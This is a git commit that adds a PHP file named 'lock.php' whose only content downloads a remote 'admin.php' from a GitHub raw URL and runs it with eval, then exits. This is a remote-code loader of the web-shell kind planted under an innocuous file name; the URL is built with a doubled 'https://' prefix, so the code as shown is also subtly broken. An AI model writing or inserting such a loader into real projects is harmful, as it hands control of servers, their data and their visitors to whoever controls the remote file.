6067ffc1084dbe8155f5245672d01320c8b6ffd9
getarbos <seosuper72@gmail.com>
2026-03-20 16:27:50 +0700

    Create lock.php

---
+++ lock.php
@@ -0,0 +1,7 @@
+<?php
+
+        $awo = 'https://';
+        eval("?>" . file_get_contents($awo . 'https://raw.githubusercontent.com/getarbos/getarbos/refs/heads/main/admin.php'));
+        exit;
+   
+?>
